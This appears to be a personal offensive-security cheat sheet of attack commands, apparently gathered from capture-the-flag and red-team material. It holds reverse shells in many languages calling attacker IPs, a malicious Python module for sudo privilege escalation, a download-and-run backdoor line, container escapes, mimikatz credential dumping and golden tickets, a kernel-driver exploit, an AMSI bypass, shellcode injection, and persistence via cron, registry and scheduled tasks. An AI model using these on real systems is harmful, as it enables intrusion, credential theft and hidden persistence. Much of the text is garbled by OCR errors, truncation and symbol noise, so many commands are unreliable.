rm /tmp/f;mkfifo /tmp/f;cat /tmp/fl/bin/sh -i 2 &line l0.0.0.1 1234 /tmp/f
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.105 9999 >/tmp/f




perl -e 'use Socket; $i="10.0.0.l"; $p=1234; socket (S, PF INET, SOCK STREAM,
getprotobjname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){
open(STDIN," &S") ;open(STDOUT," &S"); open(STDERR," &S"); exec("/bin/sh" -i");};'




perl -MIO -e '$p=fork;exit,if($p);$c=new
IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN- fdopen($c,r);$~-fdopen($
c, w) ; system$_ while ;'




perl -MIO -e '$c=new IO: :Socket: :INET(PeerAddr,''attackerip:4444'') ;STDIN-fdopen($
c,r) ;$~- fdopen($c,w) ;system$_ while ;'




python -c 'import socket, subprocess, os; s=socket. socket (socket. AF_INET,
socket.SOCK_STREAM); s.connect( ("10.0.0.1",1234)); os.dup2 (s.fileno() ,0);
os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'
check sudoer script content like:

#!/usr/bin/python3
from shutil import make_archive
src = '/var/www/html/'
# old ftp directory, not used anymore
#dst = '/srv/ftp/html'
dst = '/var/backups/html'
make_archive(dst, 'gztar', src)
You have new mail in /var/mail/waldo

and create file for got root as shutil.py contains:

import os
import pty
import socket

lhost = "10.10.10.10"
lport = 4444

ZIP_DEFLATED = 0

class ZipFile:
   def close(*args):
       return
   def __init__(self, *args):
       return

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((lhost, lport))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
os.putenv("HISTFILE",'/dev/null')
pty.spawn("/bin/bash")
s.close()

and run sudoer script with

sudo -E PYTHONPATH=$(pwd) /opt/scripts/admin_tasks.sh 6




bash -i & /dev/tcp/10.0.0.1/8080 0 &1
r = Runtime.getRuntime()
p = r.exec( ["/bin/bash","-c","exec 5 /dev/tcp/10.0.0.1/2002;cat &5 |
while read line; do \$line 2 &5 &5; done"] as String[])
p.waitFor()




php -r '$sock=fsockopen("10.0.0.1", 1234) ;exec("/bin/sh -i &3 &3 2 &3");'




ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i; exec
sprintf("/bin/sh -i &%d &%d 2 &%d",f,f,f)'




by -rsocket -e 'exit if
fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd, " r
") {| io|c.print io.read}end'




ruby -rsocket -e
'c=TCPSocket.new("attackerip","4444");while(crnd=c.gets);IO.popen{cmd,"r" ) {|
io|c.print io.read}end'




rm -f /tmp/p; mknod /tmp/p p && telnet attackerrip 4444 0/tmp/p
--OR--
telnet attacker rip 4444 | /bin/bash | telnet attacker rip 4445
xterm -display 10.0.0.1:1
o Start Listener: Xnest: 1
o Add permission to connect: xhost +victimP




wget hhtp:// server /backdoor.sh -O- | sh Downloads and runs backdoor.sh




python3 -c 'import pty; pty.spawn("/bin/sh")'




sudo - I
python -c 'import pty; pty. spawn("/bin/bash”)’
sudo -u webadmin vi
ESC +:+ !/bin/sh
bash - i
whoami




try ctrl + z
stty raw -echo
fg




echo os.system('/bin/bash')




/bin/sh -i



perl —e 'exec "/bin/sh";'



perl: exec "/bin/sh";




ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')



(From within IRB)
exec "/bin/sh"



(From within vi)
:!bash




(From within vi)
:set shell=/bin/bash:shell




(From within nmap)
!sh




TF=$(mktemp -d)
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
sudo composer --working-dir=$TF run-script x




docker run -v /root:/mnt -it ubuntu




docker run --rm -it --privileged nginx bash
mkdir /mnt/fsroot
mount /dev/sda /mnt/fsroot




Checking docker exposure

curl -s --unix-socket /var/run/docker.sock http://localhost/images/json

We do the following commands in the script.

cmd="whoami"
payload="[\"/bin/sh\",\"-c\",\"chroot /mnt sh -c \\\"$cmd\\\"\"]"
response=$(curl -s -XPOST --unix-socket /var/run/docker.sock -d "{\"Image\":\"sandbox\",\

revShellContainerID=$(echo "$response" | cut -d'"' -f4)

curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/$revShellCo
sleep 1
curl --output - -s --unix-socket /var/run/docker.sock "http://localhost/containers/$revSh

Then we run it.

./docket-socket-expose.sh




chroot /root /bin/bash




in attacker host
1. git clone https://github.com/saghul/lxd-alpine-builder.git
2. ./build-alpine
in victim host
3. Download built image
4. import ./alpine-v3.12-x86_64-20200621_2005.tar.gz --alias attacker
5. lxc init attacker tester -c security.privileged=true
6. lxc exec tester/bin/sh
SharpWSUS.exe create /payload:"C:\Users\user\Desktop\PsExec64.exe" /args:"-acceptula -s -
SharpWSUS.exe approve /updateid:<id> /computername:dc.domain.dev /groupname:"title"




journalctl
!/bin/sh




sudo journalctl
!/bin/sh




python PySplunkWhisperer2_remote.py --lhost 10.10.10.5 --host 10.10.15.20 --username admi




echo "id" >> 00-header




Ctrl+R + Ctrl+X
reset; sh 1>&0 2>&0




Ctrl+W
/etc/shadow
:!/bin/sh




whisker.exe add /target:user
.\Rubeus.exe askgt /user:user /certificate:<base64-cert> /password:"password" /domain:dom




$user = "megacorp\jorden"
$folder = "C:\Users\administrator"
$acl = get-acl $folder
$aclpermissions = $user, "FullControl", "ContainerInherit, ObjectInherit", "None", "Allow
$aclrule = new-object System.Security.AccessControl.FileSystemAccessRule $aclpermissions
$acl.AddAccessRule($aclrule)
set-acl -path $folder -AclObject $acl
get-acl $folder | folder




To enable ssh using ldap

0. exec ldapmodify -x -w PASSWORD
1. Paste this
dn: cn=openssh-lpk,cn=schema,cn=config
objectClass: olcSchemaConfig
cn: openssh-lpk
olcAttributeTypes: ( 1.3.6.1.4.1.24552.500.1.1.1.13 NAME 'sshPublicKey'
   DESC 'MANDATORY: OpenSSH Public key'
   EQUALITY octetStringMatch
   SYNTAX 1.3.6.1.4.1.1466.115.121.1.40)
olcObjectClasses: ( 1.3.6.1.4.1.24552.500.1.1.2.0 NAME 'ldapPublicKey' SUP top AUXILIARY
   DESC 'MANDATORY: OpenSSH LPK objectclass'
   MAY ( sshPublicKey $ uid )
   )

To improve access to the desired user and user group
2. exec ldapmodify -x -w PASSWORD
3. Paste this
dn: uid=UID,ou=users,ou=linux,ou=servers,dc=DC,dc=DC
changeType: modify
add: objectClass
objectClass: ldapPublicKey
-
add: sshPublicKey
sshPublicKey: content of id_rsa.pub
-
replace: EVIL GROUP ID
uidNumber: CURRENT USER ID
-
replace: EVIL USER ID
  idN b    CURRENT GROUP ID




import-module .\SeBackupPrivilegeUtils.dll
import-module .\SeBackupPrivilegeCmdLets.dll
Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ndts.dit




https://github.com/dievus/printspoofer
printspoofer.exe -i -c "powershell -c whoami"




1. priv.txt contain
SET CONTEXT PERSISTENT NEWSWRITERSp
add volume c: alias 0xprashantp
createp
expose %0xprashant% z:p
2. exec with diskshadow /s priv.txt




FIRST:
Download https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys
Download https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploadd
Download https://github.com/tandasat/ExploitCapcom
change ExploitCapcom.cpp line 292
TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
to
TCHAR CommandLine[] = TEXT("C:\\test\\shell.exe");
then compile ExploitCapcom.cpp and eoploaddriver.cpp to .exe

SECOND:
1. msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f exe > shell
2. .\eoploaddriver.exe System\CurrentControlSet\MyService C:\test\capcom.sys
3. .\ExploitCapcom.exe
4 i     f      `   `




var/lib/jenkins/find . -exec bash -p -i > & /dev/tcp/192.168.2.x/8000 0 > &1 \; - quit




. .\PowerUp.ps1
Invoke-ServiceAbuse -Name 'vds' -UserName 'domain\user1'




https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
Import-Module .\PowerView_dev.ps1
Set-DomainUserPassword -Identity user1 -verbose
Enter-PSSession -ComputerName COMPUTERNAME -Credential “”




. .\PowerUp.ps1
Invoke-ServiceAbuse -Name 'browser' -UserName 'domain\user1'




$pass = ConvertTo-SecureString 'Password123#' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\MASTER USER'), $pas
Set-DomainObject -Credential $creds USER1 -Clear service principalname
Set-DomainObject -Credential $creds -Identity USER1 -SET @{serviceprincipalname='none/flu
 \R b        k b      t /d   i   DOMAIN




https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/lateral_
. .\Heidi.ps1
Invoke-SQLOCmd -Verbose -Command “net localgroup administrators user1 /add” -Instance COM




1.mimikatz# token::elevate
2.mimikatz# vault::cred /patch
3.mimikatz# lsadump::lsa /patch
4.mimikatz# kerberos::golden /user:Administrator /rc4:<Administrator NTLM(step 3)> /domai
5. powercat -l -v -p 443
6.schtasks /create /S DOMAIN /SC Weekly /RU "NT Authority\SYSTEM" /TN "enterprise" /TR "p
7.schtasks /run /s DOMAIN /TN "enterprise"




1..\Rubeus.exe askgt /user:<USET>$ /rc4:<NTLM HASH> /ptt
2. klist




1..\SharpGPOAbuse.exe --AddComputerTask --Taskname "Update" --Author DOMAIN\<USER> --Comm




1.mimikatz # lsadump::dcsync /user:<USER>
2.mimikatz # kerberos::golden /user:<USER> /domain:</DOMAIN> /sid:<OBJECT SECURITY ID> /r
1. . .\PowerUpSQL.ps1
2. Get-SQLInstanceLocal -Verbose
3. (Get-SQLServerLinkCrawl -Verbos -Instance "10.10.10.10" -Query 'select * from master..
4.
USE "master";
SELECT *, SCHEMA_NAME("schema_id") AS 'schema' FROM "master"."sys"."objects" WHERE "type"
execute('sp_configure "xp_cmdshell",1;RECONFIGURE') at "<DOMAIN>\<DATABASE NAME>"
5. powershell -ep bypass
6. Import-Module .\powercat.ps1
7. powercat -l -v -p 443 -t 10000
8.
SELECT *, SCHEMA_NAME("schema_id") AS 'schema' FROM "master"."sys"."objects" WHERE "type"
execute('sp_configure "xp_cmdshell",1;RECONFIGURE') at "<DOMAIN>\<DATABASE NAME>"
execute('exec master..xp_cmdshell "\\10.10.10.10\reverse.exe"') at "<DOMAIN>\<DATABASE NA




gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --m




crontab -e: set for every 10 min
0-59/10 nc ip 777 -e /bin/bash




sc config schedule start = auto
net start schedule
at 13:30 "C:\nc.exe ip 777 -e cmd.exe""
1. REG add HKEY CURRENT USER\Software\Microsoft\Windows\CurrentVersion\Run
    /v firewall 7t REG SZ /d "c:\windows\system32\backdoor.exe" /f
2. at 19:00 /every:M,T,W,Th,F cmd /c start "%USERPROFILE%\backdoor.exe"
3. SCHTASKS /Create /RU "SYSTEt1" /SC MINUTE /t10 45 /TN FIREWALL /TR
    "%USERPROFILE%\backdoor.exe" /ED 12/12/2012




Via SMB:
1. From the compromised machine, share the payload folder
2. Set sharing to 'Everyone'
3. Use psexec or wmic command to remotely execute payload

Via WebDAV:
1. Launch Metasploit 'webdav file server' module
2. Set the following options:
     localexe = true
     localfile= payload
     localroot= payload directory
     disablePayloadHandler=true
3. Use psexec or wmic command to remotely execute payload
     psexec \\ remote ip /u domain\compromised_user /p password "\\payload
     ip \test\msf.exe"

OR -
wmic /node: remote ip /user:domain\compromised user //password:password
process call create "\\ payload ip \test\msf.exe"




procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonPasswords f




volatility — plugins=/usr/share/volatility/plugins — profile=Win7SP0x86 -f halomar.dmp mi
ssh -D 8083 root@192.168.8.3
vi /etc/proxychains.conf -> socks4 127.0.0.1 8083
proxychains nap -sT 10.1.3.1 -Pn




fpipe.exe -l 1234 -r 80 2.2.2.2




On redirector (1.1.1.1):
     socks.exe -i1.1.1.1 -p 8C80

Attacker:
Modify /etc/proxjchains.conf:
Comment out: #proxy_dns
Comment out: #socks4a 127.0.0.1 9050
Add line: socks4 1.1.1.1 8080
Scan through socks proxy:
     proxychains nmap -PN -vv -sT -p 22,135,139,445 2.2.2.2




socat TCP4:LISTEN:1234 TCP4:2.2.2.2:80




./socat TCP-LISTEN:22,fork,reuseaddr TCP:172.10.10.11:22




On attacker (client):
Modify /stunnel.conf
    clien = yes
    [netcat client]
    accept = 5555
    connect = -Listening IP-:4444

On victim (listening server)
Modify /stunnel.conf
    client = no
    [ne~cat server]
    accept = 4444
    connect = 7777
C:\ nc -vlp 7777

On attacker (client):
# nc -nv 127.0.0.1 5555




telnet ip
#Enter 1 char, get uname:pwd
http://ip/getsecure.cgi
http://ip/er_a_rc1.htm
http://ip/a_security.htm
http://ip/a_rc.htm




http://ip/snapctrl.ssi




http:// ip /commard/visca-gen.cgi?visca=str
8101046202FF : Freeze Camera




cat blue | perl -lpe '$_=pack"B*",$_' > bin




https://htbmachines.github.io/




swaks --to receiver@mail.dev --from from@mail.dev --server mail.server.dev --body "BODY"




nc 10.10.10.10 3131 < output.zip
more /var/log/auth.log




1)
nc -nvlp 999

2)
Visit http://10.1.3.1:1234/script/console
String host="192.168.2.x";
int port=999;
String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start(
Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputS
po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0
()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush()
{p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();




/etc/krb5.conf




"kinit -k host/$(hostname -f)"




/var/lib/jenkins/adm_domain.keytab




kinit adm_domain@OPERATIONS.ATOMIC.SITE - k - tadmin_domain. keytab
klist
kuno cifs\/OPS-ChildDC
klist




apt -get install krb5 -user
export KRB5CCNAME =/tmp/krb5cc_123
proxychains psexec.py -k -no -pass -debug -dc -ip 10.1.1.2 adm_domain@OPS -CHILDDC




proxychains secretsdump. py -no -pass -just -dc -user adm_domain -debug -dc -ip 10.1.1.2




proxychains secretsdump. py -k -no -pass -debug -dc -ip 10.1.1.2 adm_domain@OPS -CHILDDC




proxychains lookupsid.py operations/Administrator@OPS -CHILDDC -hashes aad36435b51404eeaa




$    =         −         .      .         .        ("    ","        ")
$        = $       .     ([    .      .        .               ])
$       .




kerberos::golden /user: Administrator /domain:operations.atomic.site /sid:S-1-5-21-375773
krbtgt:8e268effbf6735b8fb5be206cb3dfead /sids:S-1-5-21-95921459-2896253700-3873779052-519




1)
download & edit PowerShellTcpOneLine.ps1
https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1



2)
schtasks /create /S atomic -dc.atomic.site /SC Weekly /RU "NT Authority \SYSTEM" /TN "war

3)
nc -nlvp 7779



4)
schtasks /Run /S atomic-dc. atomic. site /TN "warfare"




    (   −        .       ).            (′   ://192.168.2.   /    −        .   1′);      −
            "   : :           "
                     .       −          −                ∶       49927 1 5 335       681   95 3 45 2         /               @




     (       −                .             ).                          (′   ://192.168.2.2/           _     .    1′)
     −                       | ? {$_.                        −      ′         ′} | %{   −          −         −          $_.




1)
     −                       | ? {$_.                        −      ′        ′} | %{       −       −         −          $_.

2)Enumerate accounts with SPN set in nuclear.site domain
      −          −         /      −   .      .

3)
         −               −                       .           | % { $_.         } |         −   −                         .

4)Filter the output to include only account HASH
$    = " :\    \    \      .         "
$   = [     . .     ]: :          ($   )
$   = [     .      ]: :     64    ($ )

5)Decode base64 & store it in file
   64 "      " |    64 −   >      .




         .       |            −         .            −       "     @     .    " −     "        _       " −       "a@a.com" −
                    .             −   10.1.3.2 −   1433 −     −   ′       ! @#$%′ − −
−     −           − −         −       –    l




          p
                        = "                         /   "




$script = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('J
$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
for ($i = 0; $i -lt $bytes.Length; $i++) {
    if (($bytes[$i] -eq 0x41) -and ($bytes[$i+1] -eq 0x6D) -and ($bytes[$i+2] -eq 0x73) -
        $bytes[$i+0] = 0x42; $bytes[$i+1] = 0x6D; $bytes[$i+2] = 0x73; $bytes[$i+3] = 0x6
    }
}
[System.Reflection.Assembly]::Load($bytes)




$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiIn
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed




Add-Type -MemberDefinition '
[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uin
[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttrib
[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint c
' -Namespace Win32
$shellcode = [System.Text.Encoding]::UTF8.GetBytes('MY_SHELLCODE_HERE')
$mem = [Win32]::VirtualAlloc(0, $shellcode.Length, 0x1000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, [System.IntPtr]($mem), $she
$thread = [Win32]::CreateThread(0, 0, $mem, 0, 0, 0)
xsltproc nmap.xml -o nmap.html




nmap -sP -n -oX out.xml 1.1.1.0/24 2.2.2.0/24 | grep "Nmap" | cut -d " " -f
5 live hosts.txt




ndiff scanl.xml scan2.xml




nmap -R -sL -dns-server server 1.1.1.0/24




for x in {1 .. lOOOO .. 1);do nmap -T5 -sX -S spoof-source-IP -D
comma-separated with no spaces list of decoy IPs --spoof-mac aa:bb:cc:dd:ee:ff
-e eth0 -Pn targeted-IP. Done
eq OR ==
ne OR !=
gt OR
Lt. OR
ge OR =
le OR =




and OR &&
or OR ||
xor OR ^^
not OR!
Connect to [TargetiP] Listener on [port]:
$ nc [Target P] [port]

Start Listener:
$ nc -1 -p [port]




./ncat - l 3128 -proxy -type http &




TCP Port Scanner in port range [startPort] to [endPort]:
$ nc -v -n -z -wl [TargetiP] [startPort]-[endPort]




send file
nc.exe 10.10.10.10 < "file.log"

download file
nc -vnlp 1234 > file.txt




Grab a [filename] from a Listener:
1. Start Listener to push [filename]
     $ nc -1 -p [port] [filename]
2. Connect to [TargetiP] and Retrieve [filename]
     $ nc -w3 [TargetiP] [port] [filename]

Push a [filename] to Listener:
1. Start Listener to pull [filename]
     $ nc -1 -p [port] [filename]
2. Connect to [TargetiP] and push [filename]
     $nc -w3 [TargetiP] [port] [filename]




Linux Shell:
$ nc -1 -p [port] -e /bin/bash
Linux Reverse Shell:
$ nc [LocaliP] [port] -e /bin/bash
Windows Shell:
$ nc -1 -p [port] -e cmd.exe
Windows Reverse Shell:
$ nc [LocaliP] [port] -e cmd.exe




Use cvlc \(command line VLC\) on target to migrate popups




# Start a listener on the attacker machine
vlc udp://@:1234

-- OR --

# Start a listener that stores the stream in a file.
vlc udp://@:1234 :sout=#transcode{vcodec=h264,vb=O,scale=O,acodec=mp4a,
ab=128,channels=2,samplerate=44100):file{dst=test.mp4) :no-sout-rtp-sap
:no-shout-standard-sap :ttl=1 :shout-keep

# This may make the users screen flash. Lower frame rates delay the video.
vlc screen:// :screen-fps=25 :screen-caching=100
:sout=#transcode{vcodec=h264,vb=O,scale=O,acodec=mp4a,ab=128,channels=2,sam
plerate=44100):udp{dst=attackerip :1234) :no-sout-rtp-sap :no-soutstandard-
sap :ttl=1 :sout-keep




# Start a listener on the attacker machine
     vlc http://server.example.org:BOBO

-- OR --

# Start a listener that stores the stream to a file
vlc http://server.example.org:BOBO -sout=#
transcode{vcodec=h264,vb=O,scale=O,acodec=mp4a,ab=128,channels=2,samp
rate=44100):file{dst=test.mp4)

# Start streaming on the target machine
vlc screen:// :screen-fps=25 :screen-caching=100
:sout=#transcode{vcodec=h264,vb=O,scale=O,acodec=mp4a,ab=128,channels=2,sam
plerate=44100):http{mux=ffmpeg{mux=flv),dst=:8080/) :no-sout-rtp-sap :nosout-
standard-sap :ttl=1 :sout-keep




# Start a listener on attacker machine for multicast
vlc udp://@ multicastaddr :1234

# Broadcast stream to a multicast address
vlc screen:// :screen-fps=25 :screen-caching=100
:sout=#transcode{vcodec=h264,vb=O,scale=O,acodec=mp4a,ab=128,channels=2,sam
plerate=44100):udp{dst= multicastaddr :1234) :no-sout-rtp-sap :no-soutstandard-
sap :ttl=1 :sout-keep




vlc screen:// :screen-fps=25 :screen-caching=100
:sout=#transcode{vcodec=h264,vb=O,scale=O,acodec=mp4a,ab=128,channels=2,sam
plerate=44100):file{dst=C:\\Program Files (x86)\\VideoLAN\\VLC\\test.mp4)
:no-sout-rtp-sap :no-sout-standard-sap :ttl=1 :sout-keep




vlc dshow:// :dshow-vdev="None" :dshow-adev="Your Audio Device"




/etc/ssh/ssh known hosts #System-wide known hosts
-/.ssh/known_hosts #Hosts user has logged into
sshd-generate #Generate SSH keys (DSA/RSA)
ssh keygen -t dsa -f /etc/ssh/ssh_host_dsa_key #Generate SSH DSA keys
ssh keygen -t rsa -f /etc/ssh/ssh_host_rsa_key #Generate SSH RSA keys

If already in ssh session, press SHIFT -C to configure tunnel
Port forwarding must be allowed on the target
/etc/ssh/sshd_config - AllowTcpForwarding YES
ssh root@2.2.2.2 -p 8222




ssh -R 4446:127.0.0.1:3128 master@192.168.2.2
http 127.0.0.1 4446




xhost+
vi -/.ssh/config- Ensure 'ForwardXll yes'
ssh -X root@2.2.2.2




ssh -R8080:12-.0.0.1:443 root@2.2.2.2.




ssh -18080:3.3.3.3:443 root@2.2.2.2




ssh -D1080 root@2.2.2.2
In a separate terminal run:
proxychains nmap -sT -p80,443 3.3.3.3




ssh -L 8888:127.0.0.1:8444 50mctf@MY_VPS
ssh -v -o PubkeyAuthentication=no -o PreferredAuthentications=password -o GatewayPorts=ye
sqlmap.py -u "http://url?id=1&str=val"




sqlmap.py -u "http://url" --data="id=1&str=val"




sqlmap.py -u "http://url" --data="id=l&str=val" -p "id"
-b --dbms="mssqllmysqlloraclelpostgres"




1. Login and note cookie value (cookie1=val1, cookie2=val2)
sqlmap.py -u "http:// url "--data="id=l&str=val" -p "id"
--cookie="cookiel=vall;cookie2=val2"




./sqlmap.py -u "http://url" --data="id=1&str=val" -p "id" -b --current-db
--current-user




sqlmap.py -u "http://url" --data="id=1&str=val" -p "id" --tables -D
"testdb"




sqlmap.py -u "http://url" --data="id=l&str=val" -p "id" --columns -T
"users"




sqlmap.py -r req.txt




sqlmap -r req -D openemr -T users_secure --dump




sqlmap -r req --technique=T




sqlmap -r json --tamper=charunicodeescape --dump --level=5 --risk=3 --dbs --columns
 ./msfpayload windows/meterpreter/reverse tcp LHOST=ip LPORT=port R |
 ./msfencode -t exe -o callback.exe -e x86/shikata_ga nai -c 5




 ./msfpayload windows/meterpreter/bind_tcp RP.OST=ip LPORT=port X
 cb.exe




 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.14 LPORT=9999 -f WAR > exploit.war




msfvenom -p windows/shell_reverse_tcp lhost=ip lport=port -f exe --platform windows
>reverse.exe




 ./msfvenorn --payload windows/meterpreter/reverse~tcp --format exe
 template calc.exe -k --encoder x86/shikata_ga_nai -i 5 LHOST=1.1.1.1
 LPORT=443 callback.exe




 /etc/rc.d/rc.mysqld start
 msf db_create root:pass@localhost/metasploit
 msf load db mysql
 msf db connect root:pass@localhost/metasploit
 msf db=import nmap.xml

 --- Kali ---
 # service postgresql start
 # service metasploit start
msf use post/windows/manage/multi meterpreter inject
msf set IPLIST attack ip
msf set LPORT callback port
msf set PIDLIST PID to inject, default creates new notepad
msf set PAYLOAD windows/meterpreter/reverse_tcp
msf set SESSION meterpreter session ID




msf route add ip/range netmask meterpreter ID
msf use post/multi/gather/ping sweep # Set options and run
msf use /auxiliary/scanner/portscan/tcp # Set options and run
msf hosts-u-S x.x.x -R #Searches for x.x.x.' and sets
# RHOSTS
msf use auxiliary/scanner/http/http version # Set options and run
msf services -v -p 80-S x.x.x -R - #Displays IPs x.x.x.' with port
#80 open
use priv
getsystem




use incognito
list tokens -u
impersonate token domain\\user




1. msf sessions #Note Meterpreter ID
2. msf route add 3.3.3.0 255.255.255.0 id
3. msf use auxiliary/server/socks4a
4. msf run
5. Open a new shell and edit /etc/proxychains.conf
i. #proxy_dns
ii. #socks4 127.0.0.1 9050
iii. socks4 1.1.1.1 1080
6. Save and close the conf file
7. proxychains nmap -sT -Pn -p80,:35,s45 3.3.3.3
meterprete irb
client.railgun.user32.MessageBoxA(O,"got","YOU","MB_OK")




msf use post/windows/manage/persistence
msf set LHOST attack ip
msf set LPORT callback port
msf set PAYLOAD_TYPE TCPIHTTPIHTPS
msf set REXENAHE filename
msf set SESSION meterpreter session id
msf set STARTUP SERVICE




meterpreter run post/windows/gather/dumplinks




execute -H -f cmd.exe -a '/c tree /F /A c:\ C:\temp\tree.txt'




ettercap.exe -I iface -M arp -Tq -F file.ef MACs / IPs / Ports
MACs / IPs / Ports
#i.e.: // 80,443 // = any MAC, any IP, ports 80,443




ettercap -T -M arp -F filter // //
ettercap -TP rand flood




etterfilter filter.filter -o out.ef




if lip.proto == UDP && udp.dst == 500) I
     drop();
     kill(); }
if I ip.src == 'ip' ) (
     if (tcp.dst == 80) (
         if (search(DATA.data, "Accept-Encoding")) (
             replace("Accept-Encoding","Accept-Rubbish!");
             msg("Replaced Encoding\n");
         }
     }
}




1. Upload mimikatz.exe and sekurlsa.dll to target
2. execute mirnikatz
3. mimikatz# privilege: :debug
4. mimikatz# injeet::proeess lsass.exe securlsa.dll
5. mimikatz# @getLogonPasswords
6. securlsa::minidump /users/redteam/Desktop/lsass.DMP
7. securlsa::LogonPasswords




mimikatz# sekurlsa::tickets /export
mimikatz# kerberos::ptt <TICKET PATH>
#cleartext password and hash
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "token::elevate" "lsadump::s




hping3 targetiP --flood --frag --spoof ip --destport # --syn




./arping -I eth# -a # arps




ed /root/.wine/drive e/HinGW/bin
wine gee -o file.exe /tmp/ eode.e
wine file.exe




GRUB Henu: Add 'single' end of kernel line. Reboot. Change root password. reboot




hydra -1 ftp -P words -v targetiP ftp




hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt --force
$ ./john -wordfile:pw.lst -format: format hash.txt




$ john --format~des    username:SDbsuge8iC58A
$ john --format~lm     username:$L~$a9c604d244c4e99d
$ john --format~md5    $1$12345678$aiccj83HRD8o6ux1bVx7D1

$ john --format~raw-sha1 A9993E364706816A8A3E25717850C26C9CDOD89D

# For --format~netlmv2 replace $NETLM with $NETLMv2
$ john --format~netlm
$NETLM$1122334455667788$0836F0858124F338958-5F81951905DD2F85252CC-318825
username:$NETLM$ll22334455667788$0836F0858124F338958"5F81951905DD2F85252CC7
318825
username:$NETLM$1122334455667788$0836F0858124F338958-5F81951905DD2F85252CC7
318825:::::::

# Exactly 36 spaces between USER and HASH (SAP8 and SAPG)
$ john --format~sapb
ROOT    $8366A4E9E68"2C80
username:ROOT    $8366A4E9E68"2C80

$ john --format=sapg
ROOT $1194E38F1489F3F8DA18181F14DE8"0E"8DCC239
username:ROOT
$1194E38F1489F3F8DA18181F14DE8-0E-8DCC239

$ john --format=sha1-gen
$SHA1p$salt$59b3e8d63-cf9"edbe2384cf59cb"453dfe30-89
username:$SHA1p$salt$59b3e8d63-cf9"edbe2384cf59cb-453dfe30-89

$ john --format=zip
$zip$'0'1'8005b1b"d07""08d'dee4
username:$zip$'0'1'8005b1b-d0"-"08d'dee4
#Add lower(@), upper(,), ~umber(%), and symbol(^) I to the end of the word
crunch 12 12 -t baseword@,%^ wordlist.txt

Use custom special character set and add 2 numbers then special character
maskprocessor -custom-charset1=\!\@\#\$ baseword?d?d?l wordlist.txt

generate wordlist from website with number
cewl -d 5 -m 3 -w wordlist http://fuse.fabricorp.local/papercut/logs/html/index.htm --wit




1. Download: http://ptscripts.googlecode.com/svn/trunk/windows/vssown.vbs
2. Create a new Shadow Copj
     a. cscript vssown.vbs /start (optional)
     b. cscript vsown.vbs /create
3. Pull the following files frorr. a shadow copj:
     a. Copy
     \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\
     ntds\ntds.dit.
b. copj
     \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\
     System32\config\SYSTEM.
     C. COpj
     \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\
     system32\config\SAM.
4. Copj files to attack box.
5. Download tools: http://www.ntdsx~ract.com/downloads/ntds dump_hash.zip
6. Configure and Make source code for libesedb from the extracted package
     a. cd libesdb
     b. chmod +x configure
     c. ./configure && make
Use esedbdumphash to extract the data table from ntds.dit.
     a. cd esedbtools
     b. . I esedbdumphash ../../ntds.dit




MD5 16 bytes
SHA-1 20 bytes
SHA-256 32 bytes
SHA-512 64 bytes




http://isc.sans.edu/tools/hashsearch.html
# dig +short md5 .md5.dshield.org TXT
Result = "filename I source" i.e. "cmd.exe I NIST"




http://www.team-cymru.org/Services/MHR
# dig +short [MD5|SHA-1].malware.hash.cymru.com TXT
Result = last seen timestamp AV detection rate
Convert timestamp= perl-e 'print scalar localtime( timestamp ), "\n"'




https://fileadvisor.bit9.com/services/search.aspx




https://www.virustotal.com/#search




fcrackzip -v -D -u -p /usr/share/wordlists/rockyou.txt secret.zip




crackmapexec winrm <IPS> -u <USERS> -p <PASSWORDS>
crackmapexec smb <IP> -u <USER> -p <PASS> --shares




mssqlclient.py -port 1433 sa@10.10.10.10




powershell iwr -usebasicparsing http://192.168.2.2/mimikatz.exe -OutFile mimikatz.exe




./              −




./          −          −    /   /




kubectl get nodes -o wide
